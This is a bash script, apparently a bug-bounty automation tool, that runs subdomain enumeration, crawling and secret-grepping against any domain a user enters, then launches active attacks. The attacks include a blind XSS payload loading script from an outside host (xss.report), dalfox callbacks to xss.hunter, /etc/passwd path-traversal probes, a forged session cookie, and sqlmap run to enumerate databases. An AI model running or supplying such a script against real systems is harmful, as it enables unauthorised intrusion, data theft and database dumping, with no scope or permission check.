#!/bin/bash

# A powerful reconnaissance and scanning tool for Kali Linux

# Function to check required dependencies
function check_dependencies() {
    # Core dependencies from Code 1 and additional ones from Code 2
    dependencies=("subfinder" "httpx-toolkit" "katana" "nuclei" "gf" "dirsearch" "sqlmap" "subzy" "python" "openredirex" "jq" "curl" "grep" "sed" "awk" "xargs" "bash")
    for dep in "${dependencies[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            echo "Error: $dep is not installed. Install it using apt, pip, or clone its repository."
            exit 1
        fi
    done
}

check_dependencies

# User inputs
read -p "Enter domain (e.g., example.com): " domain
read -p "Enter output directory: " output_dir

# Create output directory if it doesn't exist
mkdir -p "$output_dir"
cd "$output_dir" || exit

# Function to enumerate subdomains from multiple sources
function enumerate_subdomains() {
    echo "[+] Running Subfinder..."
    subfinder -d "$domain" -all -recursive > subdomains_temp.txt

    echo "[+] Collecting subdomains from crt.sh..."
    curl -s "https://crt.sh/?q=%25.$domain&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u >> subdomains_temp.txt

    echo "[+] Collecting subdomains from ThreatMiner..."
    curl -s "https://api.threatminer.org/v2/domain.php?q=$domain&rt=5" | jq -r '.results[]' | grep -o "\w.*$domain" | sort -u >> subdomains_temp.txt

    # Combine and remove duplicates
    sort -u subdomains_temp.txt > subdomains.txt
    rm subdomains_temp.txt
}

# Step 1: Subdomain enumeration
enumerate_subdomains

# Step 2: Filter live subdomains
echo "[+] Checking live subdomains with httpx..."
cat subdomains.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 -silent > subdomains_alive.txt

# Step 3: URL enumeration
echo "[+] Extracting URLs with Katana..."
katana -u subdomains_alive.txt -d 5 -kf -jc -fx -ef woff,css,png,jpg,woff2,jpeg,gif,svg -o allurls.txt

# Step 4: Extract JavaScript files
echo "[+] Extracting JS files..."
grep -E "\.js$" allurls.txt > js.txt

# Step 4.1: Download JavaScript files from js.txt
echo "[+] Downloading JavaScript files from js.txt..."
download_dir="js"
mkdir -p "$download_dir"  # Create directory if it doesn’t exist
while IFS= read -r link; do
    # Skip empty lines
    [ -z "$link" ] && continue
    # Download the file into the specified directory
    wget -P "$download_dir" "$link" -q --show-progress
done < "js.txt"
echo "[+] JavaScript files downloaded to '$download_dir'."

# Search for sensitive data in downloaded JS files
echo "[+] Searching for sensitive data in downloaded JavaScript files..."
cd "$download_dir" || exit
grep -r -i -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret|smtp|API" *.js > ../sensitive_data.txt 2>/dev/null
cd .. || exit
echo "[+] Sensitive data search completed. Results saved to 'sensitive_data.txt'."

# Step 5: Nuclei scan for exposures
echo "[+] Running Nuclei scans for JS files..."
nuclei -list js.txt -t ~/nuclei-templates/http/exposures/ -c 30

# Step 6: Sensitive file search
echo "[+] Searching for sensitive files..."
grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|_config" allurls.txt > sensitive_files.txt

# Step 7: Directory brute-forcing
echo "[+] Running Dirsearch..."
dirsearch -u "https://$domain" -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,py,rb,php,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,lock,log,rar,old,sql,sql.gz,sql.zip,tar.gz,tar,bz2,txt,wadl,zip,log,xml,js,json -o dirsearch_results.txt

# Step 8: Automated XSS scanning
echo "[+] Running automated XSS scans..."
cat subdomains_alive.txt | katana -ps -f qurl | gf xss | bxss -appendMode -payload "<script src=https://xss.report/c/coffinxp></script>"

# Additional advanced XSS one-liner from Code 2
if command -v shuf &> /dev/null && command -v hakrawler &> /dev/null && command -v urless &> /dev/null && command -v nilo &> /dev/null && command -v dalfox &> /dev/null; then
    echo "[+] Running advanced XSS one-liner..."
    subfinder -d "$domain" | dnsx | shuf | (gau || hakrawler) | anew | egrep -iv "\.(jpg|jpeg|gif|tif|tiff|png|ttf|woff|woff2|php|ico|pdf|svg|txt|js)$" | urless | nilo | dalfox pipe -b https://xss.hunter/?q=1
else
    echo "Some tools (shuf, hakrawler, urless, nilo, dalfox) for advanced XSS scanning are missing. Skipping this step."
fi

# Step 9: Subdomain takeover checks
echo "[+] Checking for subdomain takeovers..."
subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl --output subdomain_takeovers.txt

# Step 10: CORS misconfiguration check
echo "[+] Checking for CORS misconfigurations..."
python3 ~/home/kali/Desktop/Corsy -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"

# Step 11: CVE scanning
echo "[+] Running Nuclei CVE scans..."
nuclei -list subdomains_alive.txt -tags cves,osint,tech -o cve_scan_results.txt

# Step 12: LFI scanning
echo "[+] Searching for LFI vulnerabilities..."
cat allurls.txt | gf lfi | nuclei -tags lfi

# Advanced LFI scanning with qsreplace from Code 2
if command -v qsreplace &> /dev/null; then
    echo "[+] Advanced LFI scanning with qsreplace..."
    cat allurls.txt | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P25 sh -c 'curl -s "%" | grep -q "root:x" && echo "[+] VULN: %"'
fi

# Raw curl LFI bypass from Code 2
echo "[+] Raw curl LFI bypass..."
cat subdomains_alive.txt | while read host; do
    curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo -e "\n$host \033[0;31mVULNERABLE"
done

# Step 13: Open redirect scanning
echo "[+] Searching for open redirects..."
cat allurls.txt | gf redirect | openredirex -p ~/openRedirect/ -o open_redirect_results.txt

# Using waybackurls for open redirect
echo "[+] Using waybackurls for open redirect..."
echo "$domain" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew way.txt
cat way.txt | openredirex

# Step 14: SQL injection detection and exploitation
echo "[+] Running SQLi detection and exploitation..."
cat subdomains_alive.txt | gf sqli > sql.txt
sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent | tee -a sqli_results.txt

# Step 15: Information disclosure
echo "[+] Checking for information disclosure..."
cat subdomains.txt | httpx -mc 403 > 403_sub.txt
cat 403_sub.txt | dirsearch --stdin --exclude-status=401,404,403,429,500,503 -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,sql.gz,sql.zip,sql.tar.gz,sql,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,r.bz2,txt,wadl,zip,log,xml,js,json --random-agent -f -t 50 --exclude-sizes 0B -o dir.txt

# Step 16: Running Nuclei for all subdomains
echo "[+] Running Nuclei for all subdomains..."
nuclei -l subdomains_alive.txt -no-mhe
nuclei -l subdomains.txt -t ~/Desktop/Privates_templates

# Optional Shodan CLI step from Code 2
if command -v shodan &> /dev/null; then
    echo "[+] Running Shodan CLI for SSL certificates..."
    shodan search "ssl.cert.subject.cn:$domain" --fields ip_str | anew ips.txt
else
    echo "Shodan CLI is not installed. Skipping this step."
fi

echo "[+] All tasks completed. Check the '$output_dir' directory for results."
